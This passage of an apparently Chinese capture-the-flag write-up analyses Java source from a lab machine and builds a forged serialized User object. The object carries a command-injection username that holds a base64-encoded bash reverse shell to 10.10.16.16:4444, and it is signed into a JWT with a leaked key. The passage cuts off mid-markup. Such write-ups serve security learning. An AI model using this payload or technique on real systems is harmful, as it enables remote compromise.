class="hljs-keyword">protected</span> String password;<br><br>    <span class="hljs-meta">@Column(name = &quot;fingerprint&quot;)</span><br>    <span class="hljs-keyword">protected</span> String fingerprint;<br><br>    <span class="hljs-keyword">public</span> File <span class="hljs-title function_">getProfileLocation</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">File</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/data/sessions/&quot;</span>);<br>        dir.mkdirs();<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">pathname</span> <span class="hljs-operator">=</span> dir.getAbsolutePath() + <span class="hljs-string">&quot;/&quot;</span> + username + <span class="hljs-string">&quot;.ser&quot;</span>;<br>        <span class="hljs-keyword">return</span> Paths.get(pathname).normalize().toFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAdmin</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> username.equals(<span class="hljs-string">&quot;admin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateProfile</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Profile profile)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] res = SerUtils.toByteArray(profile);<br>        FileUtil.write(res, getProfileLocation());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Profile.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.admin.security.src.model;<br><br><span class="hljs-keyword">import</span> com.admin.security.src.profile.UserProfileStorage;<br><span class="hljs-keyword">import</span> lombok.Data;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Profile</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">3995854114743474071L</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;String&gt; logs;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> adminProfile;<br><br>    <span class="hljs-keyword">private</span> File avatar;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Profile <span class="hljs-title function_">getForUser</span><span class="hljs-params">(<span class="hljs-keyword">final</span> User user)</span> &#123;<br>        <span class="hljs-comment">// fetch locally saved profile</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> user.getProfileLocation();<br><br>        Profile profile;<br><br>        <span class="hljs-keyword">if</span> (!file.isFile()) &#123;<br>            <span class="hljs-comment">// no file -&gt; create empty profile</span><br>            profile = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Profile</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(), user.isAdmin());<br>            <span class="hljs-keyword">try</span> &#123;<br>                user.updateProfile(profile);<br>            &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-keyword">final</span> IOException ignored) &#123;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// init logs etc.</span><br>        profile = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProfileStorage</span>(user).readProfile();<br><br>        <span class="hljs-keyword">return</span> profile;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>以上两个java文件是扫目录得出来的，然后通过<code>import com.admin.security.src.profile.UserProfileStorage;</code>这句话又找到了一个<code>UserProfileStorage.java</code>文件，如下：</p><p>UserProfileStorage.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.admin.security.src.profile;<br><br><span class="hljs-keyword">import</span> com.admin.security.src.model.Profile;<br><span class="hljs-keyword">import</span> com.admin.security.src.model.User;<br><span class="hljs-keyword">import</span> com.admin.security.src.utils.SerUtils;<br><span class="hljs-keyword">import</span> com.admin.security.src.utils.Terminal;<br><span class="hljs-keyword">import</span> lombok.AllArgsConstructor;<br><span class="hljs-keyword">import</span> lombok.Data;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Path;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> com.admin.security.src.profile.Settings.AUTH_LOG;<br><br><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@AllArgsConstructor</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProfileStorage</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">5667788713462095525L</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> User user;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> ObjectInputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        inputStream.defaultReadObject();<br>        readProfile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Profile <span class="hljs-title function_">readProfile</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IllegalStateException &#123;<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">File</span> <span class="hljs-variable">profileFile</span> <span class="hljs-operator">=</span> user.getProfileLocation();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(profileFile.getAbsolutePath());<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] content = Files.readAllBytes(path);<br><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">Profile</span> <span class="hljs-variable">profile</span> <span class="hljs-operator">=</span> (Profile) SerUtils.from(content);<br>            <span class="hljs-keyword">if</span> (profile.isAdminProfile()) &#123; <span class="hljs-comment">// load authentication logs only for super user</span><br>                profile.getLogs().clear();<br>                <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cat &quot;</span> + AUTH_LOG.getAbsolutePath() + <span class="hljs-string">&quot; | grep &quot;</span> + user.getUsername();<br>                profile.getLogs().addAll(Arrays.asList(Terminal.run(cmd).split(<span class="hljs-string">&quot;\n&quot;</span>)));<br>            &#125;<br>            <span class="hljs-keyword">return</span> profile;<br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-keyword">final</span> Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">&quot;Error fetching profile&quot;</span>);<br>        &#125;<br><br><br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在<code>UserProfileStorage.java</code>中有这样一句话应该是潜在的系统命令执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cat &quot;</span> + AUTH_LOG.getAbsolutePath() + <span class="hljs-string">&quot; | grep &quot;</span> + user.getUsername();<br></code></pre></td></tr></table></figure><p>我们假设在传入Cookie后后端通过<code>readObject</code>还原出我们可控的<code>UserProfileStorage</code>对象，则我们可以尝试在<code>cmd</code>中注入命令达到命令执行。</p><blockquote><p>但是这里有一个疑问是我们的Cookie中反序列化得到的是User对象（前面的file命令），不是User对象，但尝试了一下两个对象都可以利用。</p></blockquote><p>而如果我们要想执行<code>cmd</code>这句话，首先是要让<code>profile.isAdminProfile()</code>这个<code>boolean</code>值为真。</p><p>往前看能够看到一个<code>user.getProfileLocation()</code>指示了读取文件的位置。而我们目前可控的有jwt亦即<code>User</code>对象，通过控制<code>User</code>对象中的<code>username</code>理论上我们就能控制<code>getProfileLocation()</code>返回的最终路径，从而控制读取的<code>profile</code>文件，最后控制生成的<code>Profile</code>对象。</p><p>而profile文件也是我们可控的，因为存在着上传的功能点，同时通过返回的路径我们也能定位到上传的文件。</p><p>再一个就是要怎么通过<code>username</code>来同时兼顾命令注入的问题。注意到在User.java中的<code>getProfileLocation</code>函数中最后返回了这个：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Paths</span>.</span></span>get(pathname).normalize<span class="hljs-literal">()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">File()</span>;<br></code></pre></td></tr></table></figure><p>测试一下可以发现在注入命令后解析依旧是没问题的。</p><p><img src="/img/Fingerprint.assets/image-20220528110515414.png" alt="image-20220528110515414"></p><p><img src="/img/Fingerprint.assets/image-20220528110937198.png" alt="image-20220528110937198"></p><h3 id="工程"><a href="#工程" class="headerlink" title="工程"></a>工程</h3><p>在测试没有问题后我们需要着手构造我们的序列化文件了。我们直接在现有的从<code>backup</code>文件夹中拿到的源代码的基础上建立工程文件即可。</p><blockquote><p>这里我们需要生成两个文件，一个是profile的序列化文件（上传），一个是user的序列化文件（放在cookie里）。</p></blockquote><p>这里使用了maven来管理依赖。</p><p>我们首先要做的是要补全FileUtil和SerUtils这两个工具类文件。最后得出的结果如下：</p><blockquote><p>参考了如下几个网站的写法：</p><p><a href="https://stackoverflow.com/questions/2836646/java-serializable-object-to-byte-array">https://stackoverflow.com/questions/2836646/java-serializable-object-to-byte-array</a></p><p><a href="https://www.tutorialspoint.com/How-to-convert-an-object-to-byte-array-in-java">https://www.tutorialspoint.com/How-to-convert-an-object-to-byte-array-in-java</a></p><p><a href="https://stackoverflow.com/questions/3736058/java-object-to-byte-and-byte-to-object-converter-for-tokyo-cabinet/3736091">https://stackoverflow.com/questions/3736058/java-object-to-byte-and-byte-to-object-converter-for-tokyo-cabinet/3736091</a></p></blockquote><p>FileUtil.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.admin.security.src.utils;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileUtil</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] data, <span class="hljs-keyword">final</span> File file)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                <span class="hljs-keyword">if</span> (!file.isFile()) &#123;<br>                        file.createNewFile();<br>                &#125;<br>                Files.write(Paths.get(file.getAbsolutePath()), data);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>SerUtils.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.admin.security.src.utils;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.lang.ClassNotFoundException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerUtils</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toByteArray(<span class="hljs-keyword">final</span> Serializable obj) <span class="hljs-keyword">throws</span> IOException &#123;<br>                <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>                <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos);<br>                oos.writeObject(obj);<br>                oos.flush();<br>                <span class="hljs-keyword">return</span> bos.toByteArray();<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">from</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>                <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data);<br>                <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bis);<br>                <span class="hljs-keyword">return</span> ois.readObject();<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个项目一开始编译的时候遇到了很多问题，主要是<code>lombok</code>的配置问题，最后<code>pom.xml</code>文件如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>11<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>11<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>11<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.16<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">pluginManagement</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>11<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>11<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">annotationProcessorPaths</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">path</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.16<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">path</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">annotationProcessorPaths</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">pluginManagement</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="伪造"><a href="#伪造" class="headerlink" title="伪造"></a>伪造</h3><p>在解决各种依赖问题后，建立App.java作为主模块，编写逻辑如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.admin.security.src;<br><br><span class="hljs-keyword">import</span> com.admin.security.src.model.Profile;<br><span class="hljs-keyword">import</span> com.admin.security.src.model.User;<br><span class="hljs-keyword">import</span> com.admin.security.src.profile.UserProfileStorage;<br><span class="hljs-keyword">import</span> com.admin.security.src.utils.SerUtils;<br><span class="hljs-keyword">import</span> com.admin.security.src.utils.FileUtil;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">( String[] args )</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 首先生成profile的序列化文件，命名为test.ser</span><br>        <span class="hljs-type">Profile</span> <span class="hljs-variable">profile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Profile</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(), <span class="hljs-literal">true</span>);<br>        FileUtil.write(SerUtils.toByteArray(profile), <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./test.ser&quot;</span>));<br><br>        <span class="hljs-comment">// 然后生成user的序列化文件，文件名需要和上面的profile文件名向对应</span><br>        <span class="hljs-comment">// 使用了常规的反弹shell的payload，解码后为</span><br>        <span class="hljs-comment">// bash -c &#x27;exec bash -i &gt;&amp; /dev/tcp/10.10.16.16/4444 0&gt;&amp;1&#x27;</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">666</span>, <span class="hljs-string">&quot;../../../../$(echo \&quot;YmFzaCAtYyAnZXhlYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjE2LzQ0NDQgMD4mMScK\&quot; | base64 -d | bash)/../../../data/uploads/test&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-comment">// 测试发现序列化UserProfileStorage对象或者User对象都能达到效果，目前原因未知。</span><br><span class="hljs-comment">//        UserProfileStorage ups = new UserProfileStorage(user);</span><br><span class="hljs-comment">//        System.out.println(Base64.getEncoder().encodeToString(SerUtils.toByteArray(ups)));</span><br>        System.out.println(Base64.getEncoder().encodeToString(SerUtils.toByteArray(user)));<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>将生成的数据填入user字段中，然后使用之前的<code>SECRET_KEY</code>生成校验段即可拿到伪造的JWT Token。</p><p><img src="/img/Fingerprint.assets/image-20220528203535288.png" alt="image-20220528203535288"></p><p>记录如下：</p><figure class="highlight 